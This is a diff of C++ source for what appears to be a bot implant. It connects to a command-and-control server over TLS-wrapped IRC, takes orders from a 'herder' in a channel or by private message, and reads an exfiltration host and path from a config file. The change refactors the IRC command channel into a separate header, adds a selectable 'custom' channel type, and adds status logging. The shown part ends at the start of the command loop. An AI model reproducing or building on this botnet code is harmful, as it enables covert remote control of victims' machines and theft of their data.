@@ -1,5 +1,5 @@
+#include "Environment.hpp"
 #include "SecureSocket.hpp"
-#include "IrcClient.hpp"
 #include "Random.hpp"
 #include "Utils.hpp"
 #include "SystemInfo.hpp"
@@ -8,78 +8,13 @@
 #include "HttpClient.hpp"
 #include "HttpUtils.hpp"
 #include "Processes.hpp"
-#include "Environment.hpp"
+#include "Channels.hpp"
 #include <thread>
 #include <fstream>
 
 using namespace Legit;
 using json = nlohmann::json;
 using namespace std;
-
-class ICommandChannel
-{
-public:
-    virtual ~ICommandChannel() { }
-
-    virtual void Send(string message) = 0;
-    virtual void Send(string message, string recipient) = 0;
-    virtual string Receive() = 0;
-};
-
-class IrcCommandChannel : public ICommandChannel
-{
-public:
-    IrcCommandChannel(string host, string port, string channel, string nick, string herder, string pem);
-    virtual ~IrcCommandChannel();
-
-    virtual void Send(string message) override;
-    virtual void Send(string message, string recipient) override;
-    virtual string Receive() override;
-
-private:
-    IrcClient client_;
-    string channel_;
-    string herder_;
-};
-
-IrcCommandChannel::~IrcCommandChannel()
-{
-    client_.Send("QUIT out\r\n");
-}
-
-IrcCommandChannel::IrcCommandChannel(string host, string port, string channel, string nick, string herder, string pem) :
-    channel_(channel),
-    herder_(herder),
-    client_(make_unique<SecureSocket>(host, port, make_unique<CertStore>(pem, false), 500), nick)
-{
-    while (!client_.ReceivedFirstPing())
-    {
-        client_.Receive();
-    }
-    client_.Send("JOIN " + channel + "\r\n");
-}
-
-void IrcCommandChannel::Send(string message)
-{
-    Send(message, herder_ == "" ? channel_ : herder_);
-}
-
-void IrcCommandChannel::Send(string message, string recipient)
-{
-    client_.Send("PRIVMSG " + recipient + " :" + message + "\r\n");
-}
-
-string IrcCommandChannel::Receive()
-{
-    auto message = client_.Receive();
-    if (message.command == "PRIVMSG")
-    { 
-        if (message.params[0] == channel_ || message.GetReturnName() == herder_)
-            return message.params[1];
-    }
-
-    return "";
-}
 
 unique_ptr<ISocket> SocketFactory(string scheme, string host)
 {
@@ -94,12 +29,16 @@ unique_ptr<ISocket> SocketFactory(string scheme, string host)
 void MainThread(unsigned int parentThreadId)
 {
     string configPath = Processes::GetExecutablePath() + Legit::SEPARATOR + "config.json";
+
+    cout << "Loading config from " << configPath << " ... ";
+
     json config;
     ifstream configFile(configPath, ios::in);
     configFile >> config;
 
     RandomGenerator rng;
 
+    string type = config["type"];
     string host = config["host"];
     string port = config["port"];
     string channel = config["channel"];
@@ -112,12 +51,24 @@ void MainThread(unsigned int parentThreadId)
     string exfilHost = exfilUrlParts[1];
     string exfilPath = exfilUrlParts[2];
 
+    cout << "Done" << endl;
+
     string certPath = Processes::GetExecutablePath() + Legit::SEPARATOR + "cc.cer";
+    cout << "Loading cert from " << certPath << " ... ";
     vector<char> pemBytes;
     DataLoader::LoadFromFile(Utils::WideFromString(certPath), pemBytes);
     string cert(pemBytes.begin(), pemBytes.end());
 
-    unique_ptr<ICommandChannel> cc = make_unique<IrcCommandChannel>(host, port, channel, nick, herder, cert);
+    cout << "Done" << endl;
+    cout << "Creating channel of type '" << type << "' ... ";
+
+    unique_ptr<ICommandChannel> cc = nullptr;
+    if (type == "irc")
+        cc = make_unique<IrcCommandChannel>(host, port, channel, nick, herder, cert);
+    else if (type == "custom")
+        cc = make_unique<CustomCommandChannel>(host, port, nick, cert);
+
+    cout << "Done" << endl;
 
     while (true)
     {
